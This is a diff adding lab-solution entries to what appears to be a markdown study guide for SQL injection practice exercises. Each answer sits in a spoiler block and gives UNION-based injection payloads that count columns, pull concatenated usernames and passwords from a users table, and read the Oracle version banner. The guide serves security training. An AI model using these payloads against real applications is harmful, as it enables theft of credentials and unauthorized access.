@@ -49,3 +49,38 @@ Do not read unless explicitly looking for exact answers
   Login using administrator and password found from injection
 
 </details>
+
+## UNION - Retrieve multiple values in single column
+
+<details>
+  <summary><b> ANSWER SPOLER ALERT </b></summary>
+  
+  Verify Number of columns with UNION attack:
+     
+    category=' UNION SELECT NULL,NULL--
+  
+  Verify which columns contain text:
+  
+    ' UNION SELECT NULL,'abc'--
+  
+  Retrieve the information from the users table using string concatenation:
+  
+    ' UNION SELECT NULL,username || password FROM users--    
+  
+  Login with administrator password
+  
+</details>
+
+## Oracle database type and version
+
+<details>
+  <summary><b> ANSWER SPOLER ALERT </b></summary>
+    
+  Retrieve database information:
+  
+    ' UNION SELECT BANNER, NULL FROM v$version--
+  
+</details>
+
+
+
